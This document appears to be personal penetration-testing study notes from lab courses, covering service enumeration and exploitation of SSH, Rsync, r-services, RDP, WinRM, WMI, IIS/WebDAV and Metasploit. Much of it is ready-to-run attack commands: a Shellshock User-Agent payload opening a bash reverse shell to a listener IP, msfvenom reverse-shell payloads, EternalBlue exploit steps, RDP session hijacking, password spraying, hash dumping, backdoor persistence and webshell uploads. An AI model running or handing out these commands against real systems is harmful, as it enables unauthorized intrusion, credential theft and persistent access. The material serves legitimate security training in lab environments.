    > One of the tools we can use to fingerprint the SSH server is ssh-audit. It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. Of course, this could be exploited by attacking the server or client at the cryptic level later.
      git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
      ./ssh-audit.py 10.129.14.132
    > Change authentication method
      ssh -v cry0l1t3@10.129.14.132 #Default connection 
      ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
    > We may encounter various banners for the SSH server during our penetration tests. By default, the banners start with the version of the protocol that can be applied and then the version of the server itself: 
      For example, with SSH-1.99-OpenSSH_3.9p1, we know that we can use both protocol versions SSH-1 and SSH-2, and we are dealing with OpenSSH server version 3.9p1. On the other hand, 
      For a banner with SSH-2.0-OpenSSH_8.2p1, we are dealing with an OpenSSH version 8.2p1 which only accepts the SSH-2 protocol version

[+] Rsync
  > Rsync is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port 873 and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection.

  > This guide(https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) covers some of the ways Rsync can be abused, most notably by listing the contents of a shared folder on a target server and retrieving files. This can sometimes be done without authentication. Other times we will need credentials. If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.
  > Some commands
    rsync OPTION SourceDirectory_or_filePath user@serverIP_or_name:Target ==> Transfer files over SSH
    rsync ~/Dir1/source.pdf test@192.168.56.100:~/Desktop/test ==>            Transfer a Specific File with Rsync
      rsync ~/Desktop/Dir1/"source pdf sample.pdf" test@192.168.56.100:~/Desktop/test ==> Use quotes for files that contain spaces in the name
    rsync ~/SourceDirectory/* username@192.168.56.100:~/Destination ==> Transfer contents of a directory with rsync
      The asterisk (*) instructs the tool to include all files in the source directory. Subdirectories are not transferred.
    rsync -a ~/Desktop/Dir1/ test@192.168.56.100:~/Desktop/test
      To include all subdirectories from the source directory, use the -r (recursive) or -a (archive) option. The -a flag is what we recommend. This option syncs recursively and keeps all permission and file settings. 
    rsync -a ~/Desktop/Dir1 test@192.168.56.100:~/Desktop/test
      Note: The trailing slash in the source path plays an important role. If you enter a source directory path without the slash at the end, rsync first transfers the source directory and then its contents.  When we open the test directory, it contains the Dir1 directory and then the rest of the files in Dir1.
    rsync -aP ~/SourceDirectory/ username@192.168.56.100:~/Destination
      To check the status of rsync transfers, use the -P option. This option displays the transfer times, as well as the names of the files and directories that are synced. If there is an issue with your connection and the sync is interrupted, -P resumes your transfers. Run the command in this format to sync recursively and check the status of the transfer:
    If you rerun the same command when there haven't been any changes in the source directory, the transfer does not occur. The reason is that rsync only transfers modifications in files and new files.

  > Probing for accessible shares
    nc -nv 127.0.0.1 873
    #list
  > Enumerating an open share
    rsync -av --list-only rsync://127.0.0.1/dev
      receiving incremental file list
      drwxr-xr-x             48 2022/09/19 09:43:10 .
      -rw-r--r--              0 2022/09/19 09:34:50 build.sh
      -rw-r--r--              0 2022/09/19 09:36:02 secrets.yaml
      drwx------             54 2022/09/19 09:43:10 .ssh
    * From the above output, we can see a few interesting files that may be worth pulling down to investigate further. We can also see that a directory likely containing SSH keys is accessible. From here, we could sync all files to our attack host with the command rsync -av rsync://127.0.0.1/dev. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the -e ssh flag, or -e "ssh -p2222" if a non-standard port is in use for SSH. This guide is helpful for understanding the syntax for using Rsync over SSH.

[+] R-Services
  > R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP. Initially developed by the Computer Systems Research Group (CSRG) at the University of California, Berkeley, r-services were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (SSH) protocols and commands due to inherent security flaws built into them. Much like telnet, r-services transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (MITM) attacks.

  > R-services span across the ports 512, 513, and 514 and are only accessible through a suite of programs known as r-commands. They are most commonly used by commercial operating systems such as Solaris, HP-UX, and AIX. While less common nowadays, we do run into them from time to time during our internal penetration tests so it is worth understanding how to approach them.

  > The R-commands suite consists of the following programs:
    * rcp (remote copy)
    * rexec (remote execution)
    * rlogin (remote login)
    * rsh (remote shell)
    * rstat
    * ruptime
    * rwho (remote who)
    Each command has its intended functionality; however, we will only cover the most commonly abused r-commands. The table below will provide a quick overview of the most frequently abused commands, including the service daemon they interact with, over what port and transport method to which they can be accessed, and a brief description of each.
Command	Service Daemon	Port	  Transport Protocol	Description
rcp	    rshd	          514	    TCP	                Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to                                                     another. It works like the cp command on Linux but provides no warning to the user for overwriting existing files on a system.
rsh	    rshd	          514	    TCP	                Opens a shell on a remote machine without a login procedure. 
                                                    Relies upon the trusted entries in the /etc/hosts.equiv and .rhosts files for validation.
rexec	  rexecd	        512	    TCP	                Enables a user to run shell commands on a remote machine.
                                                    Requires authentication through the use of a username and password through an unencrypted network socket.
                                                    Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.
rlogin	rlogind	        513	    TCP	                Enables a user to log in to a remote host over the network.
                                                    It works similarly to telnet but can only connect to Unix-like hosts.
                                                    Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.
  > The /etc/hosts.equiv file contains a list of trusted hosts and is used to grant access to other systems on the network. When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.
[+] Scanning for R-services
  > Nmap
    sudo nmap -sV -p 512,513,514 10.0.17.2
[+] Access Control & Trusted Relationships
  > The primary concern for r-services, and one of the primary reasons SSH was introduced to replace it, is the inherent issues regarding access control for these protocols. R-services rely on trusted information sent from the remote client to the host machine they are attempting to authenticate to. By default, these services utilize Pluggable Authentication Modules (PAM ==> https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/ch-pam.html) for user authentication onto a remote system; however, they also bypass this authentication through the use of the /etc/hosts.equiv and .rhosts files on the system. The hosts.equiv and .rhosts files contain a list of hosts (IPs or Hostnames) and users that are trusted by the local host when a connection attempt is made using r-commands. Entries in either file can appear like the following:
    cat .rhosts
      htb-student     10.0.17.5
      +               10.0.17.10
      +               +
  > Note: The hosts.equiv file is recognized as the global configuration regarding all users on a system, whereas .rhosts provides a per-user configuration. 
  > As we can see from this example, both files follow the specific syntax of <username> <ip address> or <username> <hostname> pairs. Additionally, the + modifier can be used within these files as a wildcard to specify anything. In this example, the + modifier allows any external user to access r-commands from the htb-student user account via the host with the IP address 10.0.17.10.
  > Misconfigurations in either of these files can allow an attacker to authenticate as another user without credentials, with the potential for gaining code execution. Now that we understand how we can potentially abuse misconfigurations in these files let's attempt to try logging into a target host using rlogin.
    m1l0js@htb[/htb]$ rlogin 10.0.17.2 -l htb-student
    Last login: Fri Dec  2 16:11:21 from localhost
    [htb-student@localhost ~]$
  > We have successfully logged in under the htb-student account on the remote host due to the misconfigurations in the .rhosts file. Once successfully logged in, we can also abuse the rwho command to list all interactive sessions on the local network by sending requests to the UDP port 513.
    Listing authenticated users using rwho
      m1l0js@htb[/htb]$ rwho
      root     web01:pts/0 Dec  2 21:34
      htb-student     workstn01:tty1  Dec  2 19:57  2:25 
    * From this information, we can see that the htb-student user is currently authenticated to the workstn01 host, whereas the root user is authenticated to the web01 host. We can use this to our advantage when scoping out potential usernames to use during further attacks on hosts over the network. However, the rwho daemon periodically broadcasts information about logged-on users, so it might be beneficial to watch the network traffic.
 > Listing Authenticated Users Using Rusers
    * To provide additional information in conjunction with rwho, we can issue the rusers command. This will give us a more detailed account of all logged-in users over the network, including information such as the username, hostname of the accessed machine, TTY that the user is logged in to, the date and time the user logged in, the amount of time since the user typed on the keyboard, and the remote host they logged in from (if applicable).
    Listing Authenticated Users Using Rusers
    m1l0js@htb[/htb]$ rusers -al 10.0.17.5
    htb-student     10.0.17.5:console          Dec 2 19:57     2:25

=-=-=
#Windows Remote Management Protocols
  > Windows servers can be managed locally using Server Manager administration tasks on remote servers. Remote management is enabled by default starting with Windows Server 2016. Remote management is a component of the Windows hardware management features that manage server hardware locally and remotely. These features include a service that implements the WS-Management protocol, hardware diagnostics and control through baseboard management controllers, and a COM API and script objects that enable us to write applications that communicate remotely through the WS-Management protocol.

  > The main components used for remote management of Windows and Windows servers are the following:
    * Remote Desktop Protocol (RDP)
    * Windows Remote Management (WinRM)
    * Windows Management Instrumentation (WMI)

####RDP
  * The Remote Desktop Protocol (RDP) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.

  * For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If Network Address Translation (NAT) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.


  * RDP has handled Transport Layer Security (TLS/SSL) since Windows Vista, which means that all data, and especially the login process, is protected in the network by its good encryption. However, many Windows systems do not insist on this but still accept inadequate encryption via RDP Security(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/8e8b2cca-c1fa-456c-8ecb-a82fc60b2322). Nevertheless, even with this, an attacker is still far from being locked out because the identity-providing certificates are merely self-signed by default. This means that the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.

  * The Remote Desktop service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the Server Manager and comes with the default setting to allow connections to the service only to hosts with Network level authentication (NLA) ==> (https://en.wikipedia.org/wiki/Network_Level_Authentication)
  > Footprinting the Service
    + Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if NLA is enabled on the server or not, the product version, and the hostname.
      nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
    + In addition, we can use --packet-trace to track the individual packages and inspect their contents manually. We can see that the RDP cookies (mstshash=nmap) used by Nmap to interact with the RDP server can be identified by threat hunters and various security services such as Endpoint Detection and Response (EDR), and can lock us out as penetration testers on hardened networks.
    + A Perl script named rdp-sec-check.pl(https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by Cisco CX Security Labs(https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.
      rdp-sec-check is a simple Perl script that requires one module from CPAN. Run cpan as root then install the Encoding::BER module:
        Installation
          # cpan
          cpan[1]> install Encoding::BER
        RDP Security check
          git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
          ./rdp-sec-check.pl 10.129.201.248
    + Initiate a RDP session
      xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
    > Using the Crowbar(https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service. As an example below, the password password123 will be tested against a list of usernames in the usernames.txt file. The attack found the valid credentials as administrator : password123 on the target RDP host.
        m1l0js@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
    > We can also use Hydra to perform an RDP password spray attack.
        m1l0js@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
    > RDP login
        m1l0js@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143

[+] Protocol Specific Attacks
    > Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.
    + RDP Session Hijacking
        - As shown in the example below, we are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.
        - To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe(https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session). So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:
        - RDP Session Hijacking
            C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
        - If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe(https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.
            C:\htb> query user
             USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
            >juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
             lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
            
            C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
            [SC] CreateService SUCCESS
        - To run the command, we can start the sessionhijack service :
        - RDP Session Hijacking
            C:\htb> net start sessionhijack
        - Once the service is started, a new terminal with the lewen user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.
        ! Note: This method no longer works on Server 2019.
    
    * RDP Pass-the-Hash (PtH)
        + There are a few caveats to this attack:
            - Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
                Account restrictions are preventing this user from singing in.
    * Latest RDP vulnerabilities
        > In 2019, a critical vulnerability was published in the RDP (TCP/3389) service that also led to remote code execution (RCE) with the identifier CVE-2019-0708. This vulnerability is known as BlueKeep. It does not require prior access to the system to exploit the service for our purposes. However, the exploitation of this vulnerability led and still leads to many malware or ransomware attacks. Large organizations such as hospitals, whose software is only designed for specific versions and libraries, are particularly vulnerable to such attacks, as infrastructure maintenance is costly. Here, too, we will not go into minute detail about this vulnerability but rather keep the focus on the concept.
        > The vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service. However, the dangerous thing here is that the vulnerability does not require user authentication to be triggered. Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a Use-After-Free (UAF) technique that uses freed memory(https://cwe.mitre.org/data/definitions/416.html) to execute arbitrary code.
        > This attack involves many different steps in the kernel of the operating system, which are not of great importance here for the time being to understand the concept behind it. After the function has been exploited and the memory has been freed, data is written to the kernel, which allows us to overwrite the kernel memory. This memory is used to write our instructions into the freed memory and let the CPU execute them. If we want to look at the technical analysis of the BlueKeep vulnerability, this article(https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/) provides a nice overview.
        >  Note: This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a "blue screen of death (BSoD)," and we should be careful before using the associated exploit. If in doubt, it's best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not. 


-=-=-=-=-=-=-=-=
[+] WinRM
  > The Windows Remote Management (WinRM) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol (SOAP) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on TCP ports 5985 and 5986 for communication, with the last port 5986 using HTTPS, as ports 80 and 443 were previously used for this task. However, since port 80 was mainly blocked for security reasons, the newer ports 5985 and 5986 are used today.

  > Another component that fits WinRM for administration is Windows Remote Shell (WinRS), which lets us execute arbitrary commands on the remote system. The program is even included on Windows 7 by default. Thus, with WinRM, it is possible to execute a remote command on another server.

  > Services like remote sessions using PowerShell and event log merging require WinRM. It is enabled by default starting with the Windows Server 2012 version, but it must first be configured for older server versions and clients, and the necessary firewall exceptions created.

  > Footprinting the service
    + As we already know, WinRM uses TCP ports 5985 (HTTP) and 5986 (HTTPS) by default, which we can scan using Nmap. However, often we will see that only HTTP (TCP 5985) is used instead of HTTPS (TCP 5986).
      nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
    + If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. The Test-WsMan(https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2) cmdlet is responsible for this, and the host's name in question is passed to it. In Linux-based environments, we can use the tool called evil-winrm(https://github.com/Hackplayers/evil-winrm), another penetration testing tool designed to interact with WinRM.
      evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!

[+] WMI
  > Windows Management Instrumentation (WMI) is Microsoft's implementation and also an extension of the Common Information Model (CIM), core functionality of the standarized Web-Based Enterprise Management (WBEM) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (WMIC). WMI is not a single program but consists of several programs and various databases, also known as repositories.
  > Footprinting the Service
    + The initialization of the WMI communication always takes place on TCP port 135, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program wmiexec.py from the Impacket toolkit can be used for this.
      /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

####Metasploit (Falta por ordenar)
* Before start
	service PostgreSQL start
    	service metasploit start
* MSF - Initiate a Database
        m1l0js@htb[/htb]$ sudo msfdb init 
    > Sometimes an error can occur if Metasploit is not up to date. This difference that causes the error can happen for several reasons. First, often it helps to update Metasploit again (apt update) to solve this problem. Then we can try to reinitialize the MSF database.
    > If the initialization is skipped and Metasploit tells us that the database is already configured, we can recheck the status of the database.
        m1l0js@htb[/htb]$ sudo msfdb status

* MSF - Connect to the Initiated Database
    m1l0js@htb[/htb]$ sudo msfdb run
    > If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:
        m1l0js@htb[/htb]$ msfdb reinit
        m1l0js@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
        m1l0js@htb[/htb]$ sudo service postgresql restart
        m1l0js@htb[/htb]$ msfconsole -q
        
        msf6 > help
        msf6 > db_status
        
        [*] Connected to msf. Connection type: PostgreSQL.
* MSF - Using the Database
    > With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. This is especially useful when we have extensive lists of hosts, loot, notes, and stored vulnerabilities for these hosts. After confirming that the database is successfully connected, we can organize our Workspaces.
    + Workspaces
        > We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.
        > To view the current Workspace list, use the workspace command. Adding a -a or -d switch after the command, followed by the workspace's name, will either add or delete that workspace to the database.
            msf6 > workspace
            * default
        > Notice that the default Workspace is named default and is currently in use according to the * symbol. Type the workspace [name] command to switch the presently used workspace. Looking back at our example, let us create a workspace for this assessment and select it.
            msf6 > workspace -a Target_1


* Modules
    /usr/share/metasploit-framework/modules
* Plugins   
        /usr/share/metasploit-framework/plugins
* Scripts
        /usr/share/metasploit-framework/scripts/
* Tools 
    > Command-line utilities that can be called directly from the msfconsole menu.
        /usr/share/metasploit-framework/tools/ 
* Some useful modules
	auxiliary/scanner/discovery/arp_sweep
    	auxiliary/scanner/portscan/tcp
    	nmap --script smb-vulns-check.nse --script-args=unsafe=1 demo.ine.local

* Update MSF
    m1l0js@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework

[+] Once msfconsole -q //We could use it
	msfupdate //Old way
    
  	search <mysearchterm> //search linux
  	show exploits //Not very practical to use.
	check //It would check if the service on the target is vulnerable to this exploit or not, instead of actually exploiting it.
  	back //If you want back to main prompt 
  	background //To return
	exploit / run
  	> Example
  		search  httpfileserver
  	  	use exploit/windows/http/rejetto_hfs_exec
  	  	info
  	  	show options
  	  	show payloads
  	  	exploit
  	  	Privilege escalation 
			sessions -l  //List sessions
			sessions -i 1 //Attach to a session
			sysinfo
			ipconfig
			route
			ps //List processes 
				ps -U SYSTEM
			getpid //See our process
			getuid //To know which user is running the process exploited by Metasploit
			getsystem // It runs a privilege escalation routine on the target machine.
			> Check if UAC is enabled
				post/windows/gather/win_privs
				> If you need to bypass the UAC 
			    		search bypassuac
			    		set session <select which you want>
			
			use post/windows/gather/hashdump //It dumps the password database of a Windows machine
				set session <session id>
			Uploading and Downloading files
				download HaxLogs.log /root/
			  	upload /root/backdoor.exe C:\\Windows //Note the backslash escaping
			shell //A standard operating system shell
  	    	Persistence
  	    		exploit/windows/local/persistence
  	    	  	background
  	    		/exploit/multi/handler //To kill all the sessions and check if we have installed the backdoor
  	    	remote port forwarding: After using auxiliary/scanner/portscan/tcp we could forward a remote machine port to the local machine port.
  			portfwd add -l 1234 -p 21 -r 192.168.228.3
  			portfwd lst 
  			background 
  			nmap -sS -sV -p 1234 localhost
  	> search meterpreter
  		Reverse shell
  			set payload windows/meterpreter/reverse/tcp
  		  	set payload linux/x86/meterpreter/reverse_tcp
  		Bind shell
  			set payload windows/meterpreter/bind_tcp
  		  	set payload java/meterpreter/bind_tcp

	> Another example
  		We could now check their home directory to find interesting files or alternatively leverage interesting modules such as
 		post/linux/gather/enum_users_history 
		or 
  	    	exploit/multi/mysql/mysql_udf_payload: It's a MySQL UDF exploit which will create a User-Defined Function (UDF) and allow us to run arbitrary commands using it.
  	      		set FORCE_UDF_UPLOAD true
  	      		set PASSWORD fArFLP29UySm4bZj
  	      		set RHOSTS server2.ine.local
  	      		set TARGET 1
  	      		set LHOST 192.73.96.2
  	      		exploit
  	      		session -i 2
  	    	auxiliary/scanner/http/tomcat_mgr_login: We will use msfvenom command to generate a malicious WAR file in order to gain the shell session on the Tomcat server
  	    	    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.73.96.2 LPORT=443 -f war > shell.war
  	    	    file shell.war


  

-=-=-=
-=-=-=-=-=-
##Vulnerability Assessment
###Linux Vulnerabilities

* Shellshock
	(){:;};.
    	> In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack
    	  CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.
	[+] Ways 
    		> Manually
    			nmap -sV  192.168.188.126 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
    	      		In the User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
    	      		In the User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>& /dev/tcp/10.10.14.12/4126 0>&1'
    	      		Another way:
    	      		  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://195.76.205.3:4127/gettime.cgi
    	    	> Metasploit 
    	      		use exploit/multi/http/apache_mod_cgi_bash_env_exec 
    	      			set targeturi /gettime.cgi
###Frequently exploited Windows services
Microsoft IIS(Internet Information Services)    80/443    Propietary web server software developed by Microsoft that runs on Windows
WebDAV(Web Distributed Authoring & Versioning)  80/443    HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server for colllaborative authoring
SMB/CIFS(Server Message Block Protocol)         445       Network file sharing protocol that is used to facilitate the sharing of files and peripherals(printers and serial ports) between computers on LAN
RDP(Remote Desktop Protocol)                    3389      Propietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system
WinRM(Windows Remote Management Protocol)       5986/443  Windows remote management protocol that can be used to facilitate remote access with Windows systems
###PsExec
* It is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user's credentials.
* PsExec authentication is performed via SMB. 
* We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
* Similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.
  	nmap -sCV 192.168.188.126
	msfconsole
  		use scanner/smb/smb_login
  			set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
  	    		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
* Once we have gained credentials
	[+] psexec.py
		psexec.py administrator@192.168.188.126 cmd.exe
	[+] metasploit
		use exploit/windows/smb/psexec
  		      set smbuser administrator
  		      set smbpass qweryuiop

###Eternalblue
* Nmap
	sudo nmap -sV -p445 -O 10.2.25.40
	nmap -sV -p445 10.2.25.40 smb-vuln-ms17-010
* Manually
	git clone https://github.com/3ndG4me/AutoBlue-MS17-010
  	pip install -r requirements.txt
  	cd shellcode
  	shell_prep.sh
  	msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.188.128 LPORT=4126
  	sc_x64.bin or sc_x86.bin
  	nc -lvnp 4126
  	python3 eternalblue_exploit7.py 192.168.188.126 /shellcode/sc_x64.bin
* Metasploit
        use windows/smb/ms17_010_eternalblue

###BlueKeep Vulnerability  
* This vulnerability has various illegitimate PoC's and exploit code that could be malicious in nature.
* Nmap 
	nmap -p 3389 192.168.188.126 
* Metasploit
	search BlueeKeep
        check
        	auxiliary/scanner/rdp/cve_2019_0708_bluekeep 
            	exploit/windows/rdp/cve_2019_0708_bluekeep_rce 
        show targets
###RDP 
* Maybe it is on another port than 3389
* Metasploit
	use auxiliary/scanner/rdp/rdp_scanner
      	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://192.168.188.126 -s 3333
      	xfreerdp /u:administrator /p:qwertyuiop /v:192.168.188.126:3333

###WinRM
* We can utilize crackmapexec to perform a brute-force on WinRM and we can also utilize a ruby script called evil-winrm to obtain a command shell session on the target system
[+] WinRM is tipically used in the following ways:
	> Remotely access and interact with Windows hosts on a local network
  	> Remotely access and  execute commands on Windows systems on the internet
  	> Manage and configure Windows systems remotely
* WinRM typically uses TCP port 5985 and 5986(HTTPS)
  	crackmapexec winrm 192.168.188.126 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
  	crackmapexec winrm 192.168.188.126 -u administrator -p tinkerbell -x "whoami"
[+] Obtain a command shell
	> With evil-winrm
  		evil-winrm -i 10.129.69.58 -u 'administrator' -p 'tinkerbell' ==> 
	> With Metasploit
    		First of all, we need to know the auth methods allowed.
    			auxiliary/scanner/winrm/winrm_auth_methods
    		Check the URI. Maybe /wmsan works
    		Valid credentials
    		  	auxiliary/scanner/winrm/winrm_login 
    		    		set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
    		    		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    		Can we execute commands?
    			auxiliary/scanner/winrm/winrm_cmd
    			Set username, password and cmd = whoami
    		Let's gain a shell
    		  	search winrm_script_exec
    		  	set force_vbs true

###Hydra
	hydra -U rdp //-U for a module
  		-M : List of servers to attack
  	hydra -h | grep -i "Supported services" //To check the available modules
###IIS
* It can be used to host both static and dynamic web pages developed in ASP.NET and PHP
[+] Supported executable file extensions
	.asp
        .aspx
        .config
        .php
[+] WebDAV
	OJO!! The IIS server is not exploitable if the root folder is protected. Also if the root folder is protected, there is no way to determine if WebDAV is even enabled.
      	It is configued to run on the IIS web server
      	In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.
      	> Tools
      		davtest(Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files)
      	  	cadaver(Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc)
      		nmap -sV -p80 --script=http-enum 10.2.17.124
      	    	hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
	> Example
		//How to use curl with credentials
      			First method. Read parameters from a file
      	      			1. Creating a file my_password_file.txt
      	      		  	2. machine example.com
      	      		  	   login USERNAME
      	      		  	   password PASSWORD
      	      		  	3. curl --netrc-file my_password_file.txt http://10.2.31.211/webdav/
      	      		Second method. Read parameters from stdin
      	      		  	curl -s -X GET http://10.2.17.24/webdav/ -K- <<<--user bob:password
      		davtest -url http://10.2.17.124/webdav -auth bob:password_123321 
      	    	cadaver http://10.2.17.124/webdav 
      	    		put /usr/share/webshells/asp/webshell.asp
      	    	Or we could use curl to upload a file
      	    		curl -T 'shell.txt' 'http://$ip'
      	    	After that delete webshell.asp
[+] Metasploit
	Listen manually
        	nmap -sV -p80 --script=http-enum 10.2.30.233
            	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=4126 -f asp > shell.asp //It is recommended to use 32 architecture because it will works on both
            	service postgreSQL start 
            	msfconsole -q
            	use multi/handler
            	  set payload windows/meterpreter/reverse_tcp
            	  set lhost 10.10.5.2
            	  set lport 4126

        search  iis upload
        	exploit/windows/iis/iis_webdav_upload_asp
            	set HttpPassword 
            	set HttpUsername
            	set PATH /webdav/metasploit.asp
###XSS 
* Finding an XSS is sometimes just a matter of injecting a harmless tag like 
	<i> : italics
      	<pre>
      	<plaintext>
      	<h1>Hello</h1>
* Some valid HTML/Javascript code
	<script>alert('XSS')</script>
      	<script>alert(window.location.hostname)</script>
      	<script>alert(document.cookie)</script> [Remember parameter http-only is very important for no access by javascript(document.cookie),java,etc.]
* Reflected XSS attacks
	//Is called reflected because an input field of the HTTP request sent by the browser gets inmediately reflected to the output page.
    	//When the malicious payload is carried inside the request that the browser of the victim sends to the vulnerable website. When users click on the link, they trigger the attack.

